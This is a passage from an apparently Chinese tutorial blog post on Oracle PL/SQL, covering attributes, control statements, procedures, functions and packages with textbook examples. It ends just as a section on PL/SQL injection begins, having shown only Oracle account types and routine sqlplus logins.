generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM emp;</span><br><span class="line"> ELSIF choice = 2 THEN</span><br><span class="line">  OPEN generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM dept;</span><br><span class="line"> ELSIF choice = 3 THEN</span><br><span class="line">  OPEN generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM salgrade;</span><br><span class="line"> END IF;</span><br><span class="line"> ...</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><h4 id="1-2-5-属性"><a href="#1-2-5-属性" class="headerlink" title="1.2.5 属性"></a>1.2.5 属性</h4><p>PL/SQL的变量和游标都有着让我们能够直接引用它们各自的数据类型或结构的属性。数据库字段和表也有类似的属性。”%”是一个属性的指示符。</p><ul><li>%TYPE</li></ul><p>%TYPE可以提供一个变量或数据库字段的数据类型，这在声明存放数据库值的变量时是非常有用的。假设我们要声明一个存放表books中的字段my_title的字段的变量时，就可以这样使用%TYPE属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_title books.title%TYPE;</span><br></pre></td></tr></table></figure><p>这样声明my_title有两个优点，第一，我们不必知道title具体类型；第二，如果我们改变了数据库中对该字段的数据类型定义的话，my_title的数据类型会在运行时做出相应的改变，并不需要手动地进行维护。</p><ul><li>%ROWTYPE</li></ul><p>在PL/SQL中，记录用于将逻辑相关数据组织起来。一个记录是由许多相关域的组合。%ROWTYPE属性返回一个记录类型，其数据类型和数据表的数据结构相一致。这样的记录类型可以完全保存从数据表中查询(SELECT)或从游标/游标变量取出(FETCH)的行记录。</p><p>行中的字段和记录中的域对应的名称和数据类型都完全一致。下面的例子中，我们声明一个dept_rec的记录。它的域名称和数据类型与表dept中的字段名称和数据类型就完全一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  dept_rec  dept%ROWTYPE;  -- declare record variable</span><br></pre></td></tr></table></figure><p>我们可以使用”.”来引用记录中的域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_deptno := dept_rec.deptno;</span><br></pre></td></tr></table></figure><p>假设我们声明了一个用于检索雇员的名字、工资、雇用日期和职称的游标，我们就可以使用%ROWTYPE来声明一个类型相同的记录，如下例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT ename, sal, hiredate, job</span><br><span class="line">   FROM emp;</span><br><span class="line"></span><br><span class="line"> emp_rec  c1%ROWTYPE;  -- declare record variable that represents</span><br><span class="line">             -- a row fetched from the emp table</span><br></pre></td></tr></table></figure><p>当我们执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FETCH c1 INTO emp_rec;</span><br></pre></td></tr></table></figure><p>表emp中ename字段的值就会赋给emp_rec的ename域，sal字段值赋给sal域，依此类推。</p><h3 id="1-3-PL-SQL-控制语句"><a href="#1-3-PL-SQL-控制语句" class="headerlink" title="1.3 PL/SQL 控制语句"></a>1.3 PL/SQL 控制语句</h3><h4 id="1-3-1-简单IF结构"><a href="#1-3-1-简单IF结构" class="headerlink" title="1.3.1 简单IF结构"></a>1.3.1 简单IF结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式&gt; THEN</span><br><span class="line">    满足条件时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><h4 id="1-3-2-IF-ELSE结构"><a href="#1-3-2-IF-ELSE结构" class="headerlink" title="1.3.2 IF-ELSE结构"></a>1.3.2 IF-ELSE结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式&gt; THEN</span><br><span class="line">    满足条件时执行的语句</span><br><span class="line">ELSE</span><br><span class="line">    不满足条件时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><h4 id="1-3-3-多重IF"><a href="#1-3-3-多重IF" class="headerlink" title="1.3.3 多重IF"></a>1.3.3 多重IF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式1&gt; THEN</span><br><span class="line">    满足条件1时执行的语句</span><br><span class="line">ELSIF &lt;布尔表达式2&gt; THEN</span><br><span class="line">    满足条件2时执行的语句</span><br><span class="line">ELSIF &lt;布尔表达式3&gt; THEN</span><br><span class="line">    满足条件3时执行的语句</span><br><span class="line">ELSE</span><br><span class="line">    满足条件1、2、3均不满足时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><p>注意：ELSIF不能写成ELSEIF</p><h4 id="1-3-4-CASE"><a href="#1-3-4-CASE" class="headerlink" title="1.3.4 CASE"></a>1.3.4 CASE</h4><p>语法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CASE 条件表达式</span><br><span class="line">    WHEN 条件表达式结果1 THEN </span><br><span class="line">        语句1</span><br><span class="line">    WHEN 条件表达式结果2 THEN</span><br><span class="line">        语句2</span><br><span class="line">    ......</span><br><span class="line">    WHEN 条件表达式结果n THEN</span><br><span class="line">        语句n</span><br><span class="line">  [ELSE 条件表达式结果]</span><br><span class="line">END CASE;</span><br></pre></td></tr></table></figure><p>语法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CASE </span><br><span class="line">  WHEN 条件表达式1 THEN</span><br><span class="line">     语句1</span><br><span class="line">  WHEN 条件表达式2 THEN</span><br><span class="line">     语句2</span><br><span class="line">  ......</span><br><span class="line">  WHEN 条件表达式n THEN </span><br><span class="line">     语句n</span><br><span class="line">  [ELSE 语句]</span><br><span class="line">END CASE;</span><br></pre></td></tr></table></figure><h4 id="1-3-5-简单循环"><a href="#1-3-5-简单循环" class="headerlink" title="1.3.5 简单循环"></a>1.3.5 简单循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">    [EXIT WHEN &lt;条件语句&gt;]</span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure><h4 id="1-3-6-WHILE循环"><a href="#1-3-6-WHILE循环" class="headerlink" title="1.3.6 WHILE循环"></a>1.3.6 WHILE循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WHILE &lt;布尔表达式&gt; LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure><h4 id="1-3-7-FOR循环"><a href="#1-3-7-FOR循环" class="headerlink" title="1.3.7 FOR循环"></a>1.3.7 FOR循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&lt;&lt;标签&gt;&gt;]</span><br><span class="line">FOR 循环计数器 IN [ REVERSE ] 下限 .. 上限 LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">END LOOP [&lt;&lt;标签&gt;&gt;];</span><br></pre></td></tr></table></figure><p>说明：</p><p>使用关键字REVERSE，循环变量自动减1。跟在IN REVERSE后面的数字应是从小到大的顺序，而且必须是整数，不能是变量或表达式。</p><h4 id="1-3-8-GOTO"><a href="#1-3-8-GOTO" class="headerlink" title="1.3.8 GOTO"></a>1.3.8 GOTO</h4><p>GOTO语句用于跳转到指定&lt;&lt;标号&gt;&gt;去执行语句，是无条件跳转到指定的标号去的意思。</p><p>注意：标号是用&lt;&lt;　&gt;&gt;括起来的标识符。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOTO label;</span><br></pre></td></tr></table></figure><p>GOTO语句缺点是会增加程序的复杂性，降低可读性，所以Oracle建议不要使用。</p><h4 id="1-3-9-NULL"><a href="#1-3-9-NULL" class="headerlink" title="1.3.9 NULL"></a>1.3.9 NULL</h4><p>空语句，执行没有任何实际效果，可以使某些语句变得有意义，提高程序的可读性，保证其他语句结构的完整性和正确性，通常用于占位置。</p><h3 id="1-4-PL-SQL-子程序"><a href="#1-4-PL-SQL-子程序" class="headerlink" title="1.4 PL/SQL 子程序"></a>1.4 PL/SQL 子程序</h3><p>子程序就是能够接受参数并被其他程序所调用的命名PL/SQL块。PL/SQL子程序有两种类型，过程和函数。</p><p>一般地，过程用于执行一个操作，而函数用于计算一个结果值。</p><p>与未命名或匿名PL/SQL块一样，子程序也有声明部分，执行部分和一个可选的异常处理部分。声明部分包含类型、游标、常量、变量、异常和嵌套子程序的声明。这些内容都是本地的，在程序退出时会自动销毁。执行部分包含赋值语句、流程控制语句和Oracle的数据操作语句。异常处理部分包含异常处理程序。思考下面用于记入借方银行账户的debit_account过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE debit_account(acct_id INTEGER, amount REAL) IS</span><br><span class="line"> old_balance  REAL;</span><br><span class="line">new_balance  REAL;</span><br><span class="line"> overdrawn   EXCEPTION;</span><br><span class="line">BEGIN</span><br><span class="line"> SELECT bal</span><br><span class="line">  INTO old_balance</span><br><span class="line">  FROM accts</span><br><span class="line">  WHERE acct_no = acct_id;</span><br><span class="line">  </span><br><span class="line">new_balance  := old_balance - amount;</span><br><span class="line"></span><br><span class="line">     IF new_balance &lt; 0 THEN</span><br><span class="line">        RAISE overdrawn;</span><br><span class="line">     ELSE</span><br><span class="line">        UPDATE accts</span><br><span class="line">            SET bal = new_balance</span><br><span class="line">        WHERE acct_no = acct_id;</span><br><span class="line">     END IF;</span><br><span class="line">EXCEPTION</span><br><span class="line"> WHEN overdrawn THEN</span><br><span class="line">  ...</span><br><span class="line">END debit_account;</span><br></pre></td></tr></table></figure><p>在被调用时，这个过程接受一个银行账号和借贷金额。它使用账号从accts表中查询账目结算信息。然后用借款金额计算新的账目结算。如果计算后的余额比零小，异常就会被抛出；否则，该账号相关信息就会被更新。</p><h4 id="1-4-1-理解PL-SQL过程"><a href="#1-4-1-理解PL-SQL过程" class="headerlink" title="1.4.1 理解PL/SQL过程"></a>1.4.1 理解PL/SQL过程</h4><p>过程是一个能执行某个特定操作的子程序。我们可以用下面的语法来编写过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[CREATE [OR REPLACE]] </span><br><span class="line">PROCEDURE procedure_name[(parameter[, parameter]...)] </span><br><span class="line"> [AUTHID &#123;DEFINER | CURRENT_USER&#125;] &#123;IS | AS&#125;  </span><br><span class="line">[PRAGMA AUTONOMOUS_TRANSACTION;] </span><br><span class="line"> [local declarations] </span><br><span class="line">BEGIN  </span><br><span class="line">executable statements </span><br><span class="line">[EXCEPTION  </span><br><span class="line">exception handlers]</span><br><span class="line">END [name];</span><br></pre></td></tr></table></figure><p>parameter的含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter_name [IN | OUT [NOCOPY] | IN OUT [NOCOPY]] datatype </span><br><span class="line">[&#123;:= | DEFAULT&#125; expression]</span><br></pre></td></tr></table></figure><p>CREATE子句能让我们创建保存在数据库中的独立过程。我们可以从SQLPlus中或是在使用动态SQL的程序中执行CREATE PROCEDURE语句。</p><p>AUTHID子句决定了存储过程是按所有者权限(默认)调用还是按当前用户权限执行，也能决定在没有限定修饰词的情况下，对所引用的对象是按所有者模式进行解析还是按当前用户模式进行解析。我们可以指定CURRENT_USER来覆盖掉程序的默认行为。</p><p>编译指示AUTONOMOUS_TRANSACTION会告诉PL/SQL编译器把过程标记为自治(独立)。自治事务能让我们把主事务挂起，执行SQL操作，提交或回滚自治事务，然后再恢复主事务。</p><p>我们不能对参数的数据类型进行约束，如下例中对acct_id的声明就是不合法的，因为它对CHAR类型进行了长度限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE reconcile (acct_id CHAR(5)) IS ... -- illegal</span><br></pre></td></tr></table></figure><p>但是，我们可以使用下面的方法间接的对字符的长度进行限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  </span><br><span class="line">SUBTYPE Char5 IS CHAR(5);  </span><br><span class="line">PROCEDURE reconcile (acct_id Char5) IS ...</span><br></pre></td></tr></table></figure><p>过程有两个部分，过程说明和过程体。说明部分由关键字PROCEDURE开头，以过程名或参数列表结尾。参数声明是可选的。没有参数的过程是不用使用圆括号的。</p><p>过程体由关键字IS(或AS)开头，并以END结尾，END后面可以跟上一个可选的过程名。过程体有三个部分：声明、执行和可选的异常处理。</p><p>声明部分包括本地声明，它处于IS和BEGIN之间。在匿名PL/SQL块使用的关键字DECLARE在这里不再需要。执行部分包括许多语句，它们被放到BEGIN和EXCEPTION(或END)之间，并且至少要有一条语句出现在过程的执行部分。NULL语句可以满足这个需求。异常处理部分包含异常处理程序，它被放在关键字EXCEPTION和END之间。</p><p>在下面的过程raise_salary中，我们会根据给定的金额来为雇员加薪：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE raise_salary(emp_id INTEGER, amount REAL) IS  </span><br><span class="line">current_salary  REAL;  </span><br><span class="line">salary_missing  EXCEPTION; </span><br><span class="line">BEGIN  </span><br><span class="line">SELECT sal   </span><br><span class="line">INTO current_salary   </span><br><span class="line">FROM emp   </span><br><span class="line">WHERE empno = emp_id;   </span><br><span class="line"></span><br><span class="line">IF current_salary IS NULL THEN   </span><br><span class="line">RAISE salary_missing;  </span><br><span class="line">ELSE   </span><br><span class="line">UPDATE emp    </span><br><span class="line">        SET sal = sal + amount    </span><br><span class="line">        WHERE empno = emp_id;  </span><br><span class="line">    END IF; </span><br><span class="line"></span><br><span class="line">EXCEPTION  </span><br><span class="line">WHEN NO_DATA_FOUND THEN   </span><br><span class="line">INSERT INTO emp_audit      </span><br><span class="line">VALUES (emp_id, *&#x27;No such number&#x27;*);  </span><br><span class="line">WHEN salary_missing THEN   </span><br><span class="line">INSERT INTO emp_audit      </span><br><span class="line">VALUES (emp_id, *&#x27;Salary is null&#x27;*); </span><br><span class="line">END raise_salary;</span><br></pre></td></tr></table></figure><p>在调用时，过程接受雇员编号和薪资调整金额，然后用雇员编号从emp表找出指定雇员的当前工资。如果雇员编号无法找到或是当前工资为空，异常就会被抛出，否则工资就会被更新。</p><p>过程可以作为一个PL/SQL语句来调用。例如，我们可以像下面这样调用raise_salary：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raise_salary(emp_id, amount);</span><br></pre></td></tr></table></figure><h4 id="1-4-2-理解PL-SQL函数"><a href="#1-4-2-理解PL-SQL函数" class="headerlink" title="1.4.2 理解PL/SQL函数"></a>1.4.2 理解PL/SQL函数</h4><p>函数是一个能够计算结果值的子程序，函数除了有一个RETURN子句之外，其它结构跟过程类似。我们可以用下面的语法来编写(本地)函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[CREATE [OR REPLACE ] ]  </span><br><span class="line">FUNCTION function_name [ ( parameter [ , parameter ]... ) ] RETURN datatype  </span><br><span class="line">[ AUTHID &#123; DEFINER | CURRENT_USER &#125; ]  </span><br><span class="line">[ PARALLEL_ENABLE  </span><br><span class="line">[ &#123; [CLUSTER parameter BY (column_name [, column_name ]... ) ] |  </span><br><span class="line">[ORDER parameter BY (column_name [ , column_name ]... ) ] &#125; ]  </span><br><span class="line">[ ( PARTITION parameter BY  &#123; </span><br><span class="line">[ &#123;RANGE | HASH &#125; (column_name [, column_name]...)] | ANY &#125;  </span><br><span class="line">) ]  </span><br><span class="line">]  </span><br><span class="line">[DETERMINISTIC] [ PIPELINED [ USING implementation_type ] ]  </span><br><span class="line">[ AGGREGATE [UPDATE VALUE] [WITH EXTERNAL CONTEXT]  </span><br><span class="line">USING implementation_type ] &#123;IS | AS&#125;  </span><br><span class="line">[ PRAGMA AUTONOMOUS_TRANSACTION; ]  </span><br><span class="line">[ local declarations ] </span><br><span class="line">BEGIN  </span><br><span class="line">executable statements </span><br><span class="line">[ EXCEPTION  </span><br><span class="line">exception handlers ] </span><br><span class="line">END [ name ];</span><br></pre></td></tr></table></figure><p>函数的语法结构与过程类似，这里就不再重复。但有几个不同点还是需要注意的。</p><p>PARALLEL_ENABLE选项能声明一个在并发DML操作的从属会话(slave session)中被安全调用的存储函数。主(logon)会话的状态不会被从属会话所共享。每个从属会话都有它自己的状态，这是在会话开始时初始化的。函数的结果不应依赖于会话(静态)变量的状态。否则结果就可能随着会话而发生变化。</p><p>提示DETERMINISTIC能帮助优化程序避免冗余的函数调用。如果存储函数的调用跟前一次调用时所使用的参数相同，优化程序就直接选出前一次的计算结果值。函数结果不应该依赖于会话变量或模式对象的状态。否则结果会随着调用而发生变化。只有DETERMINISTIC函数才允许被函数索引或是参数query_rewrite_enabled为TRUE的实体化视图调用。</p><p>我们不能对参数或是函数返回值的类型添加约束，但可以像前面的过程那样使用间接的约束方法。</p><h3 id="1-5-包-Package"><a href="#1-5-包-Package" class="headerlink" title="1.5 包-Package"></a>1.5 包-Package</h3><p>PL/SQL可以让我们把逻辑相关的类型、变量、游标和子程序放在一个包内，这样更加清楚易理解。包通常有两部分组成：包说明部分和包体部分。包说明部分是应用程序的接口，它声明了类型、常量、变量、异常、游标和可以使用的子程序。包体用于实现包说明部分声明的子程序和游标。</p><p>下面的例子是把两个雇用相关的过程进行打包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS  -- package specification</span><br><span class="line">PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...);</span><br><span class="line"></span><br><span class="line"> PROCEDURE fire_employee(emp_id NUMBER);</span><br><span class="line">END emp_actions;</span><br><span class="line"></span><br><span class="line">CREATE PACKAGE BODY emp_actions AS  -- package body</span><br><span class="line"> PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...) IS</span><br><span class="line"> BEGIN</span><br><span class="line">  INSERT INTO emp</span><br><span class="line">    VALUES (empno, ename, ...);</span><br><span class="line"> END hire_employee;</span><br><span class="line"></span><br><span class="line"> PROCEDURE fire_employee(emp_id NUMBER) IS</span><br><span class="line"> BEGIN</span><br><span class="line">  DELETE FROM emp</span><br><span class="line">     WHERE empno = emp_id;</span><br><span class="line"> END fire_employee;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><p>只有在包说明中声明的内容对应用程序是可见的，而包体中的内容是不可见，无法访问的。包被编译后会存放到数据库中，当我们首次调用包中的子程序时，整个包就会被加载到内存当中，所以，后续的调用不再涉及到磁盘的读取问题。因此，包可以提高效率改善性能。</p><h4 id="1-4-1-PL-SQL包的优点"><a href="#1-4-1-PL-SQL包的优点" class="headerlink" title="1.4.1 PL/SQL包的优点"></a>1.4.1 PL/SQL包的优点</h4><p>包提供了几个优点：模块化、方便应用程序设计、信息隐藏、附加功能和良好的性能。</p><ul><li>模块化</li></ul><p>包能让我们把逻辑相关的类型、常量、变量、异常和子程序等放到一个命名的PL/SQL模块中。每一个包都容易理解，包与包之间接口简单、清晰。这将有助于程序开发。</p><ul><li>轻松的程序设计</li></ul><p>设计应用程序时，我们首先要确定的是包说明中的接口信息。我们可以在没有包体的条件下编写并编译说明部分。然后引用该包的存储子程序也会被编译。在完成整个应用程序之前，我们是不需要完全实现包体部分的。</p><ul><li>信息隐藏</li></ul><p>有了包，我们就可以指定哪些类型、常量、变量、异常和子程序等是公有(可见和可访问)或私有(隐藏和不可访问)。例如，如果一个包里包含了四个子程序，其中三个是公有的一个是私有的。包就会隐藏私有子程序的实现，这样的话，如果实现内容发生改变，受到影响的只有包本身(不是我们的应用程序)。同样，对用户隐藏实现细节也能保证包的完整性。</p><ul><li>附加功能</li></ul><p>打包公有变量和游标在一个会话期会一直存在。所以，它们可以被当前环境下的所有子程序共享。并且它们允许我们跨事务来维护数据而不用把它保存在数据库中。</p><ul><li>良好的性能</li></ul><p>在我们首次调用打包子程序时，整个包就会被加载到内存中。所以，以后调用包中的相关子程序时，就不需要再次读取磁盘了。包能阻塞级联依赖，这样就能避免不必要的编译。例如，如果我们改变打包函数的实现，Oracle不需要重新编译调用子程序，因为它们并不依赖于包体。</p><h4 id="1-4-2-理解包体"><a href="#1-4-2-理解包体" class="headerlink" title="1.4.2 理解包体"></a>1.4.2 理解包体</h4><p>包体是对包说明的实现。也就是说包体中包含了包说明中声明的每一个游标和子程序的实现。一定要记住，包体内实现的内容只有在包说明中声明之后才能在包外引用。为了匹配包说明和包体，PL/SQL做了一个token-by-token的子程序头比较。所以，除了空白内容，头部内容必须完全一致。否则，PL/SQL就会抛出异常，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS</span><br><span class="line">...</span><br><span class="line"> PROCEDURE calc_bonus(date_hired emp.hiredate%TYPE, ...);</span><br><span class="line">END emp_actions;</span><br><span class="line"></span><br><span class="line">CREATE PACKAGE BODY emp_actions AS</span><br><span class="line"> ...</span><br><span class="line"> PROCEDURE calc_bonus(date_hired DATE, ...) IS</span><br><span class="line">-- parameter declaration raises an exception because &#x27;DATE&#x27;*</span><br><span class="line"> -- does not match &#x27;emp.hiredate%TYPE&#x27; word for word*</span><br><span class="line">BEGIN </span><br><span class="line">... </span><br><span class="line">END;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><h4 id="1-4-3-包特性的例子"><a href="#1-4-3-包特性的例子" class="headerlink" title="1.4.3 包特性的例子"></a>1.4.3 包特性的例子</h4><p>下面是一个名为emp_actions的包。包说明声明了类型、游标、异常和子程序：</p><ol><li>类型EmpRecTyp和DeptRecTyp</li><li>游标desc_salary</li><li>异常invalid_salary</li><li>函数hire_employee和raise_salary</li><li>过程fire_empire和raise_salary</li></ol><p>在编写包之后，我们就可以开发引用它声明的类型，调用它的子程序、游标和异常的应用程序。创建包时，它就会被存放在Oracle数据库中供广泛地调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS</span><br><span class="line"> /* Declare externally visible types, cursor, exception. */</span><br><span class="line">TYPE emprectyp IS RECORD(</span><br><span class="line">emp_id  INT,</span><br><span class="line">  salary  REAL</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line">TYPE deptrectyp IS RECORD(</span><br><span class="line">dept_id  INT,</span><br><span class="line">  LOCATION  VARCHAR2</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line">CURSOR desc_salary RETURN emprectyp;</span><br><span class="line"></span><br><span class="line">invalid_salary  EXCEPTION;</span><br><span class="line"></span><br><span class="line"> /* Declare externally callable subprograms. */</span><br><span class="line">FUNCTION hire_employee(</span><br><span class="line"> ename  VARCHAR2,</span><br><span class="line">  job   VARCHAR2,</span><br><span class="line">  mgr   REAL,</span><br><span class="line">  sal   REAL,</span><br><span class="line">  comm   REAL,</span><br><span class="line">  deptno  REAL</span><br><span class="line"> )</span><br><span class="line">  RETURN INT;</span><br><span class="line"></span><br><span class="line">PROCEDURE fire_employee(emp_id INT);</span><br><span class="line"></span><br><span class="line">PROCEDURE raise_salary(emp_id INT, grade INT, amount REAL);</span><br><span class="line"></span><br><span class="line">FUNCTION nth_highest_salary(n INT)</span><br><span class="line">RETURN emprectyp;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><h2 id="2-PL-SQL-注入漏洞"><a href="#2-PL-SQL-注入漏洞" class="headerlink" title="2.PL/SQL 注入漏洞"></a>2.PL/SQL 注入漏洞</h2><h3 id="2-1-Oracle-权限"><a href="#2-1-Oracle-权限" class="headerlink" title="2.1 Oracle 权限"></a>2.1 Oracle 权限</h3><p>在创建用户之前，可以登录系统管理员权限去创建一个用户（因为系统管理员有这个权限），下面是三种用户分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys；   //系统管理员，拥有最高权限</span><br><span class="line">system；//本地管理员，次高权限</span><br><span class="line">scott； //普通用户，密码默认为tiger,默认未解锁</span><br></pre></td></tr></table></figure><p>在登陆的时候，可以选择下面三种登录方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlplus / as sysdba；  //登陆sys帐户</span><br><span class="line">sqlplus sys as sysdba；//同上</span><br><span class="line">sqlplus scott/tiger；  //登陆普通用户scott</span><br></pre></td></tr></table></figure><p>可以参考Oracle安全标签机制（OLS-BLP模型）</p><ol><li>定义者权限（默认情况下）</li></ol><p><img 